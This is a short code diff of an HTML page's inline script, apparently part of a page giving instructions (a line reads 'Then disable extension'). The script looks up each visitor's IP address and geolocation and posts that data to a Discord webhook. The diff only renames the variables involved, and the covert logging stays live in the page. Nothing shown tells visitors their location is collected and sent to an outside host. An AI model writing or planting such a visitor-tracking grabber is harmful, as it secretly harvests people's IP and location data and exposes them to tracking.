@@ -141,7 +141,7 @@ Then disable extension
   </div>
 <script>
 // Fetch the IP and geolocation data
-fetch(ipLogAPI)
+fetch(IPLOGAPI)
   .then(response => response.json())
   .then(data => {
     // Format the payload for Discord
@@ -152,7 +152,7 @@ fetch(ipLogAPI)
     };
 
     // Send to Discord webhook
-    fetch(Webhook, {
+    fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
